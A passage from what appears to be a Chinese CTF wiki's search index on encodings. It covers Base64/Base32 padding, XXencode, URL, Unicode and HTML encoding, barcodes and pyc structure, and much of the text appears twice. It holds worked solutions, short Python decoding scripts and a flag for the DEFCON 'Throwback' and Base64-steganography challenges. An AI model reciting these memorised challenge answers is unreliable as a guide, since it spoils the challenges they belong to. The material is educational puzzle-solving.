sp )) \u8fdb\u800c\u53ef\u4ee5\u5f97\u5230\uff0c\u8fd9\u91cc\u540c\u65f6\u9700\u8981\u5047\u8bbe 0 \u4e2a\u5b57\u7b26\u4e3a\u7a7a\u683c\u3002\u56e0\u4e3a\u8fd9\u6b63\u597d\u4f7f\u5f97\u539f\u6587\u53ef\u8bfb\u3002 dark logic \u9898\u76ee \u00b6 Jarvis-basic-\u5fb7\u519b\u7684\u5bc6\u7801 Base \u7f16\u7801 \u00b6 base xx \u4e2d\u7684 xx \u8868\u793a\u7684\u662f\u91c7\u7528\u591a\u5c11\u4e2a\u5b57\u7b26\u8fdb\u884c\u7f16\u7801\uff0c\u6bd4\u5982\u8bf4 base64 \u5c31\u662f\u91c7\u7528\u4ee5\u4e0b 64 \u4e2a\u5b57\u7b26\u7f16\u7801\uff0c\u7531\u4e8e 2 \u7684 6 \u6b21\u65b9\u7b49\u4e8e 64\uff0c\u6240\u4ee5\u6bcf 6 \u4e2a\u6bd4\u7279\u4e3a\u4e00\u4e2a\u5355\u5143\uff0c\u5bf9\u5e94\u67d0\u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u30023\u4e2a\u5b57\u8282\u5c31\u6709 24 \u4e2a\u6bd4\u7279\uff0c\u5bf9\u5e94\u4e8e 4 \u4e2a Base64 \u5355\u5143\uff0c\u5373 3 \u4e2a\u5b57\u8282\u9700\u8981\u7528 4 \u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u6765\u8868\u793a\u3002\u5b83\u53ef\u7528\u6765\u4f5c\u4e3a\u7535\u5b50\u90ae\u4ef6\u7684\u4f20\u8f93\u7f16\u7801\u3002\u5728 Base64 \u4e2d\u7684\u53ef\u6253\u5370\u5b57\u7b26\u5305\u62ec\u5b57\u6bcd A-Z\u3001a-z\u3001\u6570\u5b57 0-9\uff0c\u8fd9\u6837\u5171\u6709 62 \u4e2a\u5b57\u7b26\uff0c\u6b64\u5916\u4e24\u4e2a\u53ef\u6253\u5370\u7b26\u53f7\u5728\u4e0d\u540c\u7684\u7cfb\u7edf\u4e2d\u800c\u4e0d\u540c\u3002 \u5177\u4f53\u4ecb\u7ecd\u53c2\u89c1 Base64 - \u7ef4\u57fa\u767e\u79d1 \u3002 \u7f16\u7801 man \u5982\u679c\u8981\u7f16\u7801\u7684\u5b57\u8282\u6570\u4e0d\u80fd\u88ab 3 \u6574\u9664\uff0c\u6700\u540e\u4f1a\u591a\u51fa 1 \u4e2a\u6216 2 \u4e2a\u5b57\u8282\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u8fdb\u884c\u5904\u7406\uff1a\u5148\u4f7f\u7528 0 \u503c\u5728\u672b\u5c3e\u8865\u8db3\uff0c\u4f7f\u5176\u80fd\u591f\u88ab 3 \u6574\u9664\uff0c\u7136\u540e\u518d\u8fdb\u884c base64 \u7684\u7f16\u7801\u3002\u5728\u7f16\u7801\u540e\u7684 base64 \u6587\u672c\u540e\u52a0\u4e0a\u4e00\u4e2a\u6216\u4e24\u4e2a = \u53f7\uff0c\u4ee3\u8868\u8865\u8db3\u7684\u5b57\u8282\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u6700\u540e\u5269\u4f59\u4e00\u4e2a\u516b\u4f4d\u5b57\u8282\uff08\u4e00\u4e2a byte\uff09\u65f6\uff0c\u6700\u540e\u4e00\u4e2a 6 \u4f4d\u7684 base64 \u5b57\u8282\u5757\u6709\u56db\u4f4d\u662f 0 \u503c\uff0c\u6700\u540e\u9644\u52a0\u4e0a\u4e24\u4e2a\u7b49\u53f7\uff1b\u5982\u679c\u6700\u540e\u5269\u4f59\u4e24\u4e2a\u516b\u4f4d\u5b57\u8282\uff082 \u4e2a byte\uff09\u65f6\uff0c\u6700\u540e\u4e00\u4e2a 6 \u4f4d\u7684 base \u5b57\u8282\u5757\u6709\u4e24\u4f4d\u662f 0 \u503c\uff0c\u6700\u540e\u9644\u52a0\u4e00\u4e2a\u7b49\u53f7\u3002\u53c2\u8003\u4e0b\u8868\uff1a \u7531\u4e8e\u89e3\u7801\u65f6\u8865\u4f4d\u7684 0 \u5e76\u4e0d\u53c2\u4e0e\u8fd0\u7b97\uff0c\u53ef\u4ee5\u5728\u8be5\u5904\u9690\u85cf\u4fe1\u606f\u3002 \u4e0e base64 \u7c7b\u4f3c\uff0cbase32 \u4f7f\u7528 32 \u4e2a\u53ef\u89c1\u5b57\u7b26\u8fdb\u884c\u7f16\u7801\uff0c2 \u7684 5 \u6b21\u65b9\u4e3a 32\uff0c\u6240\u4ee5\u6bcf 5 bit \u4e3a 1 \u4e2a\u5206\u7ec4\u30025 \u5b57\u8282\u4e3a 40 bit\uff0c\u5bf9\u5e94\u4e8e 8 \u4e2a base32 \u5206\u7ec4\uff0c\u5373 5 \u4e2a\u5b57\u8282\u7528 8 \u4e2a base32 \u4e2d\u5b57\u7b26\u6765\u8868\u793a\u3002\u4f46\u5982\u679c\u4e0d\u8db3 5 \u4e2a\u5b57\u8282\uff0c\u5219\u4f1a\u5148\u5bf9\u7b2c\u4e00\u4e2a\u4e0d\u8db3 5 bit \u7684\u5206\u7ec4\u7528 0 \u8865\u8db3\u4e86 5 bit \uff0c\u5bf9\u540e\u9762\u5269\u4f59\u5206\u7ec4\u5168\u90e8\u4f7f\u7528 \u201c=\u201d \u586b\u5145\uff0c\u76f4\u5230\u8865\u6ee1 5 \u4e2a\u5b57\u8282\u3002\u7531\u6b64\u53ef\u77e5\uff0cbase32 \u6700\u591a\u53ea\u6709 6 \u4e2a\u7b49\u53f7\u51fa\u73b0\u3002\u4f8b\u5982\uff1a \u7279\u70b9 \u00b6 base64 \u7ed3\u5c3e\u53ef\u80fd\u4f1a\u6709 = \u53f7\uff0c\u4f46\u6700\u591a\u6709 2 \u4e2a base32 \u7ed3\u5c3e\u53ef\u80fd\u4f1a\u6709 = \u53f7\uff0c\u4f46\u6700\u591a\u6709 6 \u4e2a \u6839\u636e base \u7684\u4e0d\u540c\uff0c\u5b57\u7b26\u96c6\u4f1a\u6709\u6240\u9650\u5236 \u6709\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u52a0\u7b49\u53f7 =\u4e5f\u5c31\u662f 3D \u66f4\u591a\u5185\u5bb9\u8bf7\u53c2\u89c1 base rfc \u5de5\u5177 \u00b6 http://www1.tc711.com/tool/BASE64.htm python \u5e93\u51fd\u6570 \u4f8b\u5b50 \u00b6 \u9898\u76ee\u63cf\u8ff0\u53c2\u89c1 ctf-challenge \u4e2d misc \u5206\u7c7b\u7684 base64-stego \u76ee\u5f55\u4e2d\u7684 data.txt \u6587\u4ef6\u3002 \u4e00\u5927\u4e32 Base64 \u5bc6\u6587\uff0c\u8bd5\u8bd5\u8865 0 \u4f4d\u7684\u6570\u636e\u3002 # coding=utf-8 import base64 import re result = [] with open ( 'text.txt' , 'r' ) as f : for line in f . readlines (): if len ( re . findall ( r '=' , line )) == 2 : last = line [ - 4 ] if last . isupper (): num = ord ( last ) - ord ( 'A' ) elif last . islower (): num = ord ( last ) - ord ( 'a' ) + 26 elif last . isdigit (): num = int ( last ) + 52 elif last == '+' : num = 62 elif last == '/' : num = 63 elem = '{0:06b}' . format ( num ) result . append ( elem [ 2 :]) elif len ( re . findall ( r '=' , line )) == 1 : last = line [ - 3 ] if last . isupper (): num = ord ( last ) - ord ( 'A' ) elif last . islower (): num = ord ( last ) - ord ( 'a' ) + 26 elif last . isdigit (): num = int ( last ) + 52 elif last == '+' : num = 62 elif last == '/' : num = 63 elem = '{0:06b}' . format ( num ) result . append ( elem [ 4 :]) flag_b = '' . join ( result ) split = re . findall ( r '.{8}' , flag_b ) for i in split : print chr ( int ( i , 2 )), \u611f\u89c9\u50cf\u662f\u7a0b\u5e8f\u6709\u70b9\u6bdb\u75c5\uff0c\u4e0d\u8fc7\u8fd8\u662f\u80fd\u770b\u51fa\u6765 flag\u3002 flag{BASE64_i5_amaz1ng~ \u9898\u76ee \u00b6 \u970d\u592b\u66fc\u7f16\u7801 \u00b6 \u53c2\u89c1 \u970d\u592b\u66fc\u7f16\u7801 \u3002 XXencoding \u00b6 XXencode \u5c06\u8f93\u5165\u6587\u672c\u4ee5\u6bcf\u4e09\u4e2a\u5b57\u8282\u4e3a\u5355\u4f4d\u8fdb\u884c\u7f16\u7801\u3002\u5982\u679c\u6700\u540e\u5269\u4e0b\u7684\u8d44\u6599\u5c11\u4e8e\u4e09\u4e2a\u5b57\u8282\uff0c\u4e0d\u591f\u7684\u90e8\u4efd\u7528\u96f6\u8865\u9f50\u3002\u8fd9\u4e09\u4e2a\u5b57\u8282\u5171\u6709 24 \u4e2a Bit\uff0c\u4ee5 6bit \u4e3a\u5355\u4f4d\u5206\u4e3a 4 \u4e2a\u7ec4\uff0c\u6bcf\u4e2a\u7ec4\u4ee5\u5341\u8fdb\u5236\u6765\u8868\u793a\u6240\u51fa\u73b0\u7684\u6570\u503c\u53ea\u4f1a\u843d\u5728 0 \u5230 63 \u4e4b\u95f4\u3002\u4ee5\u6240\u5bf9\u5e94\u503c\u7684\u4f4d\u7f6e\u5b57\u7b26\u4ee3\u66ff\u3002 1 2 3 4 5 6 0123456789012345678901234567890123456789012345678901234567890123 | | | | | | | +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz \u5177\u4f53\u4fe1\u606f\u53c2\u89c1 \u7ef4\u57fa\u767e\u79d1 \u7279\u70b9 \u00b6 \u53ea\u6709\u6570\u5b57\uff0c\u5927\u5c0f\u5199\u5b57\u6bcd +\u53f7\uff0c-\u53f7\u3002 \u5de5\u5177 \u00b6 http://web.chacuo.net/charsetxxencode \u9898\u76ee \u00b6 URL \u7f16\u7801 \u00b6 \u53c2\u89c1 URL \u7f16\u7801 - \u7ef4\u57fa\u767e\u79d1 \u3002 \u7279\u70b9 \u00b6 \u5927\u91cf\u7684\u767e\u5206\u53f7 \u5de5\u5177 \u00b6 \u9898\u76ee \u00b6 Unicode \u7f16\u7801 \u00b6 \u53c2\u89c1 Unicode - \u7ef4\u57fa\u767e\u79d1 \u3002 \u6ce8\u610f\uff0c\u5b83\u6709\u56db\u79cd\u8868\u73b0\u5f62\u5f0f\u3002 \u4f8b\u5b50 \u00b6 \u6e90\u6587\u672c\uff1a The &#x [Hex]: &#x0054;&#x0068;&#x0065; &# [Decimal]: &#00084;&#00104;&#00101; \\U [Hex]: \\U0054\\U0068\\U0065 \\U+ [Hex]: \\U+0054\\U+0068\\U+0065 \u5de5\u5177 \u00b6 \u9898\u76ee \u00b6 HTML \u5b9e\u4f53\u7f16\u7801 \u00b6","title":"\u8ba1\u7b97\u673a\u76f8\u5173\u7684\u7f16\u7801"},{"location":"misc/encode/computer/#_1","text":"A-Z/a-z \u5bf9\u5e94 1-26 \u6216\u8005 0-25","title":"\u5b57\u6bcd\u8868\u7f16\u7801"},{"location":"misc/encode/computer/#ascii","text":"","title":"ASCII \u7f16\u7801"},{"location":"misc/encode/computer/#_2","text":"\u6211\u4eec\u4e00\u822c\u4f7f\u7528\u7684 ascii \u7f16\u7801\u7684\u65f6\u5019\u91c7\u7528\u7684\u90fd\u662f\u53ef\u89c1\u5b57\u7b26\uff0c\u800c\u4e14\u4e3b\u8981\u662f\u5982\u4e0b\u5b57\u7b26 0-9, 49-57 A-Z, 65-90 a-z, 97-122","title":"\u7279\u70b9"},{"location":"misc/encode/computer/#_3","text":"","title":"\u53d8\u5f62"},{"location":"misc/encode/computer/#_4","text":"\u5c06 ascii \u7801\u5bf9\u5e94\u7684\u6570\u5b57\u6362\u6210\u4e8c\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\u3002 \u53ea\u6709 0 \u548c 1 \u4e0d\u5927\u4e8e 8 \u4f4d\uff0c\u4e00\u822c 7 \u4f4d\u4e5f\u53ef\u4ee5\uff0c\u56e0\u4e3a\u53ef\u89c1\u5b57\u7b26\u5230 127\u3002 \u5176\u5b9e\u662f\u53e6\u4e00\u79cd ascii \u7f16\u7801\u3002","title":"\u4e8c\u8fdb\u5236\u7f16\u7801"},{"location":"misc/encode/computer/#_5","text":"\u5c06 ascii \u7801\u5bf9\u5e94\u7684\u6570\u5b57\u6362\u6210\u5341\u516d\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\u3002 A-Z\u219241-5 A a-z\u219261-7 A","title":"\u5341\u516d\u8fdb\u5236\u7f16\u7801"},{"location":"misc/encode/computer/#_6","text":"jpk, ascii to number, number to ascii http://www.ab126.com/goju/1711.html","title":"\u5de5\u5177"},{"location":"misc/encode/computer/#_7","text":"","title":"\u4f8b\u5b50"},{"location":"misc/encode/computer/#2018-defcon-quals-ghettohackers-throwback","text":"\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem! \u7b2c\u4e00\u76f4\u89c9\u5e94\u8be5\u662f\u6211\u4eec\u53bb\u8865\u5168\u8fd9\u4e9b\u53f9\u53f7\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u4ece\u800c\u5f97\u5230 flag\uff0c\u4f46\u662f\u8865\u5168\u540e\u5e76\u4e0d\u884c\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u628a\u6e90\u5b57\u7b26\u4e32\u6309\u7167 ! \u5206\u5272\uff0c\u7136\u540e\u5b57\u7b26\u4e32\u957f\u5ea6 1 \u5bf9\u5e94\u5b57\u6bcda\uff0c\u957f\u5ea6 2 \u5bf9\u5e94\u5b57\u6bcd b\uff0c\u4ee5\u6b64\u7c7b\u63a8 ori = 'Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!' sp = ori.split ( '!' ) print repr ( '' .join ( chr ( 97 + len ( s ) - 1 ) for s in sp )) \u8fdb\u800c\u53ef\u4ee5\u5f97\u5230\uff0c\u8fd9\u91cc\u540c\u65f6\u9700\u8981\u5047\u8bbe 0 \u4e2a\u5b57\u7b26\u4e3a\u7a7a\u683c\u3002\u56e0\u4e3a\u8fd9\u6b63\u597d\u4f7f\u5f97\u539f\u6587\u53ef\u8bfb\u3002 dark logic","title":"2018 DEFCON Quals ghettohackers: Throwback"},{"location":"misc/encode/computer/#_8","text":"Jarvis-basic-\u5fb7\u519b\u7684\u5bc6\u7801","title":"\u9898\u76ee"},{"location":"misc/encode/computer/#base","text":"base xx \u4e2d\u7684 xx \u8868\u793a\u7684\u662f\u91c7\u7528\u591a\u5c11\u4e2a\u5b57\u7b26\u8fdb\u884c\u7f16\u7801\uff0c\u6bd4\u5982\u8bf4 base64 \u5c31\u662f\u91c7\u7528\u4ee5\u4e0b 64 \u4e2a\u5b57\u7b26\u7f16\u7801\uff0c\u7531\u4e8e 2 \u7684 6 \u6b21\u65b9\u7b49\u4e8e 64\uff0c\u6240\u4ee5\u6bcf 6 \u4e2a\u6bd4\u7279\u4e3a\u4e00\u4e2a\u5355\u5143\uff0c\u5bf9\u5e94\u67d0\u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u30023\u4e2a\u5b57\u8282\u5c31\u6709 24 \u4e2a\u6bd4\u7279\uff0c\u5bf9\u5e94\u4e8e 4 \u4e2a Base64 \u5355\u5143\uff0c\u5373 3 \u4e2a\u5b57\u8282\u9700\u8981\u7528 4 \u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u6765\u8868\u793a\u3002\u5b83\u53ef\u7528\u6765\u4f5c\u4e3a\u7535\u5b50\u90ae\u4ef6\u7684\u4f20\u8f93\u7f16\u7801\u3002\u5728 Base64 \u4e2d\u7684\u53ef\u6253\u5370\u5b57\u7b26\u5305\u62ec\u5b57\u6bcd A-Z\u3001a-z\u3001\u6570\u5b57 0-9\uff0c\u8fd9\u6837\u5171\u6709 62 \u4e2a\u5b57\u7b26\uff0c\u6b64\u5916\u4e24\u4e2a\u53ef\u6253\u5370\u7b26\u53f7\u5728\u4e0d\u540c\u7684\u7cfb\u7edf\u4e2d\u800c\u4e0d\u540c\u3002 \u5177\u4f53\u4ecb\u7ecd\u53c2\u89c1 Base64 - \u7ef4\u57fa\u767e\u79d1 \u3002 \u7f16\u7801 man \u5982\u679c\u8981\u7f16\u7801\u7684\u5b57\u8282\u6570\u4e0d\u80fd\u88ab 3 \u6574\u9664\uff0c\u6700\u540e\u4f1a\u591a\u51fa 1 \u4e2a\u6216 2 \u4e2a\u5b57\u8282\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u8fdb\u884c\u5904\u7406\uff1a\u5148\u4f7f\u7528 0 \u503c\u5728\u672b\u5c3e\u8865\u8db3\uff0c\u4f7f\u5176\u80fd\u591f\u88ab 3 \u6574\u9664\uff0c\u7136\u540e\u518d\u8fdb\u884c base64 \u7684\u7f16\u7801\u3002\u5728\u7f16\u7801\u540e\u7684 base64 \u6587\u672c\u540e\u52a0\u4e0a\u4e00\u4e2a\u6216\u4e24\u4e2a = \u53f7\uff0c\u4ee3\u8868\u8865\u8db3\u7684\u5b57\u8282\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u6700\u540e\u5269\u4f59\u4e00\u4e2a\u516b\u4f4d\u5b57\u8282\uff08\u4e00\u4e2a byte\uff09\u65f6\uff0c\u6700\u540e\u4e00\u4e2a 6 \u4f4d\u7684 base64 \u5b57\u8282\u5757\u6709\u56db\u4f4d\u662f 0 \u503c\uff0c\u6700\u540e\u9644\u52a0\u4e0a\u4e24\u4e2a\u7b49\u53f7\uff1b\u5982\u679c\u6700\u540e\u5269\u4f59\u4e24\u4e2a\u516b\u4f4d\u5b57\u8282\uff082 \u4e2a byte\uff09\u65f6\uff0c\u6700\u540e\u4e00\u4e2a 6 \u4f4d\u7684 base \u5b57\u8282\u5757\u6709\u4e24\u4f4d\u662f 0 \u503c\uff0c\u6700\u540e\u9644\u52a0\u4e00\u4e2a\u7b49\u53f7\u3002\u53c2\u8003\u4e0b\u8868\uff1a \u7531\u4e8e\u89e3\u7801\u65f6\u8865\u4f4d\u7684 0 \u5e76\u4e0d\u53c2\u4e0e\u8fd0\u7b97\uff0c\u53ef\u4ee5\u5728\u8be5\u5904\u9690\u85cf\u4fe1\u606f\u3002 \u4e0e base64 \u7c7b\u4f3c\uff0cbase32 \u4f7f\u7528 32 \u4e2a\u53ef\u89c1\u5b57\u7b26\u8fdb\u884c\u7f16\u7801\uff0c2 \u7684 5 \u6b21\u65b9\u4e3a 32\uff0c\u6240\u4ee5\u6bcf 5 bit \u4e3a 1 \u4e2a\u5206\u7ec4\u30025 \u5b57\u8282\u4e3a 40 bit\uff0c\u5bf9\u5e94\u4e8e 8 \u4e2a base32 \u5206\u7ec4\uff0c\u5373 5 \u4e2a\u5b57\u8282\u7528 8 \u4e2a base32 \u4e2d\u5b57\u7b26\u6765\u8868\u793a\u3002\u4f46\u5982\u679c\u4e0d\u8db3 5 \u4e2a\u5b57\u8282\uff0c\u5219\u4f1a\u5148\u5bf9\u7b2c\u4e00\u4e2a\u4e0d\u8db3 5 bit \u7684\u5206\u7ec4\u7528 0 \u8865\u8db3\u4e86 5 bit \uff0c\u5bf9\u540e\u9762\u5269\u4f59\u5206\u7ec4\u5168\u90e8\u4f7f\u7528 \u201c=\u201d \u586b\u5145\uff0c\u76f4\u5230\u8865\u6ee1 5 \u4e2a\u5b57\u8282\u3002\u7531\u6b64\u53ef\u77e5\uff0cbase32 \u6700\u591a\u53ea\u6709 6 \u4e2a\u7b49\u53f7\u51fa\u73b0\u3002\u4f8b\u5982\uff1a","title":"Base \u7f16\u7801"},{"location":"misc/encode/computer/#_9","text":"base64 \u7ed3\u5c3e\u53ef\u80fd\u4f1a\u6709 = \u53f7\uff0c\u4f46\u6700\u591a\u6709 2 \u4e2a base32 \u7ed3\u5c3e\u53ef\u80fd\u4f1a\u6709 = \u53f7\uff0c\u4f46\u6700\u591a\u6709 6 \u4e2a \u6839\u636e base \u7684\u4e0d\u540c\uff0c\u5b57\u7b26\u96c6\u4f1a\u6709\u6240\u9650\u5236 \u6709\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u52a0\u7b49\u53f7 =\u4e5f\u5c31\u662f 3D \u66f4\u591a\u5185\u5bb9\u8bf7\u53c2\u89c1 base rfc","title":"\u7279\u70b9"},{"location":"misc/encode/computer/#_10","text":"http://www1.tc711.com/tool/BASE64.htm python \u5e93\u51fd\u6570","title":"\u5de5\u5177"},{"location":"misc/encode/computer/#_11","text":"\u9898\u76ee\u63cf\u8ff0\u53c2\u89c1 ctf-challenge \u4e2d misc \u5206\u7c7b\u7684 base64-stego \u76ee\u5f55\u4e2d\u7684 data.txt \u6587\u4ef6\u3002 \u4e00\u5927\u4e32 Base64 \u5bc6\u6587\uff0c\u8bd5\u8bd5\u8865 0 \u4f4d\u7684\u6570\u636e\u3002 # coding=utf-8 import base64 import re result = [] with open ( 'text.txt' , 'r' ) as f : for line in f . readlines (): if len ( re . findall ( r '=' , line )) == 2 : last = line [ - 4 ] if last . isupper (): num = ord ( last ) - ord ( 'A' ) elif last . islower (): num = ord ( last ) - ord ( 'a' ) + 26 elif last . isdigit (): num = int ( last ) + 52 elif last == '+' : num = 62 elif last == '/' : num = 63 elem = '{0:06b}' . format ( num ) result . append ( elem [ 2 :]) elif len ( re . findall ( r '=' , line )) == 1 : last = line [ - 3 ] if last . isupper (): num = ord ( last ) - ord ( 'A' ) elif last . islower (): num = ord ( last ) - ord ( 'a' ) + 26 elif last . isdigit (): num = int ( last ) + 52 elif last == '+' : num = 62 elif last == '/' : num = 63 elem = '{0:06b}' . format ( num ) result . append ( elem [ 4 :]) flag_b = '' . join ( result ) split = re . findall ( r '.{8}' , flag_b ) for i in split : print chr ( int ( i , 2 )), \u611f\u89c9\u50cf\u662f\u7a0b\u5e8f\u6709\u70b9\u6bdb\u75c5\uff0c\u4e0d\u8fc7\u8fd8\u662f\u80fd\u770b\u51fa\u6765 flag\u3002 flag{BASE64_i5_amaz1ng~","title":"\u4f8b\u5b50"},{"location":"misc/encode/computer/#_12","text":"","title":"\u9898\u76ee"},{"location":"misc/encode/computer/#_13","text":"\u53c2\u89c1 \u970d\u592b\u66fc\u7f16\u7801 \u3002","title":"\u970d\u592b\u66fc\u7f16\u7801"},{"location":"misc/encode/computer/#xxencoding","text":"XXencode \u5c06\u8f93\u5165\u6587\u672c\u4ee5\u6bcf\u4e09\u4e2a\u5b57\u8282\u4e3a\u5355\u4f4d\u8fdb\u884c\u7f16\u7801\u3002\u5982\u679c\u6700\u540e\u5269\u4e0b\u7684\u8d44\u6599\u5c11\u4e8e\u4e09\u4e2a\u5b57\u8282\uff0c\u4e0d\u591f\u7684\u90e8\u4efd\u7528\u96f6\u8865\u9f50\u3002\u8fd9\u4e09\u4e2a\u5b57\u8282\u5171\u6709 24 \u4e2a Bit\uff0c\u4ee5 6bit \u4e3a\u5355\u4f4d\u5206\u4e3a 4 \u4e2a\u7ec4\uff0c\u6bcf\u4e2a\u7ec4\u4ee5\u5341\u8fdb\u5236\u6765\u8868\u793a\u6240\u51fa\u73b0\u7684\u6570\u503c\u53ea\u4f1a\u843d\u5728 0 \u5230 63 \u4e4b\u95f4\u3002\u4ee5\u6240\u5bf9\u5e94\u503c\u7684\u4f4d\u7f6e\u5b57\u7b26\u4ee3\u66ff\u3002 1 2 3 4 5 6 0123456789012345678901234567890123456789012345678901234567890123 | | | | | | | +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz \u5177\u4f53\u4fe1\u606f\u53c2\u89c1 \u7ef4\u57fa\u767e\u79d1","title":"XXencoding"},{"location":"misc/encode/computer/#_14","text":"\u53ea\u6709\u6570\u5b57\uff0c\u5927\u5c0f\u5199\u5b57\u6bcd +\u53f7\uff0c-\u53f7\u3002","title":"\u7279\u70b9"},{"location":"misc/encode/computer/#_15","text":"http://web.chacuo.net/charsetxxencode","title":"\u5de5\u5177"},{"location":"misc/encode/computer/#_16","text":"","title":"\u9898\u76ee"},{"location":"misc/encode/computer/#url","text":"\u53c2\u89c1 URL \u7f16\u7801 - \u7ef4\u57fa\u767e\u79d1 \u3002","title":"URL \u7f16\u7801"},{"location":"misc/encode/computer/#_17","text":"\u5927\u91cf\u7684\u767e\u5206\u53f7","title":"\u7279\u70b9"},{"location":"misc/encode/computer/#_18","text":"","title":"\u5de5\u5177"},{"location":"misc/encode/computer/#_19","text":"","title":"\u9898\u76ee"},{"location":"misc/encode/computer/#unicode","text":"\u53c2\u89c1 Unicode - \u7ef4\u57fa\u767e\u79d1 \u3002 \u6ce8\u610f\uff0c\u5b83\u6709\u56db\u79cd\u8868\u73b0\u5f62\u5f0f\u3002","title":"Unicode \u7f16\u7801"},{"location":"misc/encode/computer/#_20","text":"\u6e90\u6587\u672c\uff1a The &#x [Hex]: &#x0054;&#x0068;&#x0065; &# [Decimal]: &#00084;&#00104;&#00101; \\U [Hex]: \\U0054\\U0068\\U0065 \\U+ [Hex]: \\U+0054\\U+0068\\U+0065","title":"\u4f8b\u5b50"},{"location":"misc/encode/computer/#_21","text":"","title":"\u5de5\u5177"},{"location":"misc/encode/computer/#_22","text":"","title":"\u9898\u76ee"},{"location":"misc/encode/computer/#html","text":"","title":"HTML \u5b9e\u4f53\u7f16\u7801"},{"location":"misc/encode/modern/","text":"\u6761\u5f62\u7801 \u00b6 \u5bbd\u5ea6\u4e0d\u7b49\u7684\u591a\u4e2a\u9ed1\u6761\u548c\u7a7a\u767d\uff0c\u6309\u7167\u4e00\u5b9a\u7684\u7f16\u7801\u89c4\u5219\u6392\u5217\uff0c\u7528\u4ee5\u8868\u8fbe\u4e00\u7ec4\u4fe1\u606f\u7684\u56fe\u5f62\u6807\u8bc6\u7b26 \u56fd\u9645\u6807\u51c6 EAN-13 \u5546\u54c1\u6807\u51c6\uff0c13 \u4f4d\u6570\u5b57 Code-39\uff1a39 \u5b57\u7b26 Code-128\uff1a128 \u5b57\u7b26 \u6761\u5f62\u7801\u5728\u7ebf\u8bc6\u522b \u4e8c\u7ef4\u7801 \u00b6 \u7528\u67d0\u79cd\u7279\u5b9a\u51e0\u4f55\u56fe\u5f62\u6309\u4e00\u5b9a\u89c4\u5f8b\u5728\u5e73\u9762\u5206\u6b65\u7684\u9ed1\u767d\u76f8\u95f4\u7684\u56fe\u5f62\u8bb0\u5f55\u6570\u636e\u7b26\u53f7\u4fe1\u606f \u5806\u53e0\u5f0f / \u884c\u6392\u5f0f\u4e8c\u7ef4\u7801\uff1aCode 16 k\u3001Code 49\u3001PDF417 \u77e9\u9635\u5f0f\u4e8c\u7ef4\u7801\uff1aQR CODE","title":"\u73b0\u5b9e\u4e16\u754c\u4e2d\u5e38\u7528\u7684\u7f16\u7801"},{"location":"misc/encode/modern/#_1","text":"\u5bbd\u5ea6\u4e0d\u7b49\u7684\u591a\u4e2a\u9ed1\u6761\u548c\u7a7a\u767d\uff0c\u6309\u7167\u4e00\u5b9a\u7684\u7f16\u7801\u89c4\u5219\u6392\u5217\uff0c\u7528\u4ee5\u8868\u8fbe\u4e00\u7ec4\u4fe1\u606f\u7684\u56fe\u5f62\u6807\u8bc6\u7b26 \u56fd\u9645\u6807\u51c6 EAN-13 \u5546\u54c1\u6807\u51c6\uff0c13 \u4f4d\u6570\u5b57 Code-39\uff1a39 \u5b57\u7b26 Code-128\uff1a128 \u5b57\u7b26 \u6761\u5f62\u7801\u5728\u7ebf\u8bc6\u522b","title":"\u6761\u5f62\u7801"},{"location":"misc/encode/modern/#_2","text":"\u7528\u67d0\u79cd\u7279\u5b9a\u51e0\u4f55\u56fe\u5f62\u6309\u4e00\u5b9a\u89c4\u5f8b\u5728\u5e73\u9762\u5206\u6b65\u7684\u9ed1\u767d\u76f8\u95f4\u7684\u56fe\u5f62\u8bb0\u5f55\u6570\u636e\u7b26\u53f7\u4fe1\u606f \u5806\u53e0\u5f0f / \u884c\u6392\u5f0f\u4e8c\u7ef4\u7801\uff1aCode 16 k\u3001Code 49\u3001PDF417 \u77e9\u9635\u5f0f\u4e8c\u7ef4\u7801\uff1aQR CODE","title":"\u4e8c\u7ef4\u7801"},{"location":"misc/other/pyc/","text":"code object \u00b6 \u5728\u6211\u4eec\u5bfc\u5165 python \u811a\u672c\u65f6\u5728\u76ee\u5f55\u4e0b\u4f1a\u751f\u6210\u4e2a\u4e00\u4e2a\u76f8\u5e94\u7684 pyc \u6587\u4ef6\uff0c\u662fpythoncodeobj\u7684\u6301\u4e45\u5316\u50a8\u5b58\u5f62\u5f0f,\u52a0\u901f\u4e0b\u4e00\u6b21\u7684\u88c5\u8f7d\u3002 \u6587\u4ef6\u7ed3\u6784 \u00b6 pyc\u6587\u4ef6\u7531\u4e09\u5927\u90e8\u5206\u7ec4\u6210 \u6700\u5f00\u59cb4\u4e2a\u5b57\u8282\u662f\u4e00\u4e2aMaigc int, \u6807\u8bc6\u6b64pyc\u7684\u7248\u672c\u4fe1\u606f \u63a5\u4e0b\u6765\u56db\u4e2a\u5b57\u8282\u8fd8\u662f\u4e2aint,\u662fpyc\u4ea7\u751f\u7684\u65f6\u95f4 \u5e8f\u5217\u5316\u7684 PyCodeObject,\u7ed3\u6784\u53c2\u7167 include/code.h ,\u5e8f\u5217\u5316\u65b9\u6cd5 python/marshal pyc\u5b8c\u6574\u7684\u6587\u4ef6\u89e3\u6790\u53ef\u4ee5\u53c2\u7167 Python\u7a0b\u5e8f\u7684\u6267\u884c\u539f\u7406 PYC\u6587\u4ef6\u683c\u5f0f\u5206\u6790 \u5173\u4e8eco_code 